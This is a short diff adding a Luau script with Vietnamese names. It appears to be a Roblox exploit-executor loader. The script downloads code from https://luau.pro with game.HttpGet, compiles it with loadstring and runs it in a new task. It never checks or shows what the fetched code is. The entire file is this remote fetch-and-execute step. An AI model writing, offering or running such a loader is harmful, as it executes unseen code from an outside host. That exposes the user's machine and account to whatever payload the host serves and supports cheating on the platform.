@@ -1,0 +1,12 @@
+local thanhCong, maNguonTho = pcall(game.HttpGet, game, "https://luau.pro")
+
+if thanhCong and type(maNguonTho) == "string" and #maNguonTho > 0 then
+    local hamThucThi, loiCuPhap = loadstring(maNguonTho)
+    if hamThucThi then
+        task.spawn(hamThucThi)
+    else
+        warn("Lỗi Cú Pháp: " .. tostring(loiCuPhap))
+    end
+else
+    warn("Lỗi Mạng: Tải mã nguồn thất bại.")
+end
